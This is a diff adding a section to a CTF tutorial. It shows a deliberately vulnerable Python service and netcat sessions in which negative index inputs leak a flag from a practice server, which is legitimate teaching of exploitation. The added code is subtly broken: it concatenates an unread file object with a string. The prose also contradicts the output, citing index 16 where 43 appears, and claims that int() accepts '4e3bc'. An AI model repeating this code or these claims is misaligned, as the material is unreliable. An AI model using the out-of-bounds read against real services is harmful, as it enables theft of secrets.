@@ -1300,6 +1300,96 @@ service.
 
 ### Information Leakage
 
+Information leaks are very interesting vulnerabilities that allow you to leak
+what goes on under the hood of the program. Take a look at the following script:
+
+```python
+#!/usr/bin/python
+
+import sys
+
+FLAG = open("/home/infoleak/flag")
+PUBLIC_DATA = "RainRainGoAwayComeAgainAnotherDay"
+
+def write(data):
+    sys.stdout.write(data)
+    sys.stdout.flush()
+
+def main():
+    haystack = FLAG + PUBLIC_DATA
+    write("Welcome to the Infoleak!\n")
+    write("Please enter an index: ")
+
+    index = len(FLAG) + int(sys.stdin.readline())
+    write("Giving you the data from index %d...\n" % index)
+    write("Here's the data: %s\n" % haystack[index:])
+
+
+if __name__ == "__main__":
+    main()
+```
+
+Can you spot the vulnerability? The service is running at `nc pwn.spro.ink
+1338`. Let's try interacting with it.
+
+```bash
+elliot@ctf101-shell:~/ctf101$ nc pwn.spro.ink 1338
+Welcome to the Infoleak!
+Please enter an index: 0
+Giving you the data from index 43...
+Here's the data: RainRainGoAwayComeAgainAnotherDay
+elliot@ctf101-shell:~/ctf101$ nc pwn.spro.ink 1338
+Welcome to the Infoleak!
+Please enter an index: 10
+Giving you the data from index 53...
+Here's the data: AwayComeAgainAnotherDay
+elliot@ctf101-shell:~/ctf101$
+```
+
+Now, certain things in the output should raise some red flags here. Notice how
+when entering a zero index, we are given data from index 16. Now, looking back
+at the source code, we can observe that the data comes from the 'haystack'
+variable. This variable is a concatenation of the 'FLAG' and 'PUBLIC\_DATA' and
+our supplied index is added to the length of 'FLAG' which means any 'legitimate'
+value that we type will result in the calculated index landing within the 'safe'
+public data.
+
+You may not have recognised it, but our infoleak vulnerability occurs here:
+
+```python
+    index = len(FLAG) + int(sys.stdin.readline())
+```
+
+When supplying an index of zero, we can obtain the length of the flag. We'll use
+this information later. Let's try to make the program behave in a non-intended
+manner right now. Notice that the program is using int() to convert a string
+into an integer. Most programming languages support inputs such as "1", "999",
+and with some parameters, "4e3bc" but remember, negative integers are integers
+too and are properly handled by these parsers. Let's see if it works:
+
+```bash
+elliot@ctf101-shell:~/ctf101$ nc pwn.spro.ink 1338
+Welcome to the Infoleak!
+Please enter an index: -2
+Giving you the data from index 41...
+Here's the data: }
+RainRainGoAwayComeAgainAnotherDay
+elliot@ctf101-shell:~/ctf101$
+```
+
+And it does! Supplying a negative integer will allow us to read data from the
+non-public segment of the 'haystack'. It is just a matter of applying the
+information of the flag length we obtained just now to get the entire flag.
+
+```bash
+elliot@ctf101-shell:~/ctf101$ nc pwn.spro.ink 1338
+Welcome to the Infoleak!
+Please enter an index: -43
+Giving you the data from index 0...
+Here's the data: ctf101{w3ll_1_gu355_th3y_4r3_fl0ating_n0w}
+RainRainGoAwayComeAgainAnotherDay
+elliot@ctf101-shell:~/ctf101$
+```
 
 ### Arbitrary File Read
 
@@ -1346,7 +1436,6 @@ service.
 ## 11 Debuggers
 
 - GDB
-- GDB Extension - PEDA
 - Inputs
 - Breakpoints
 - Examining and modifying context
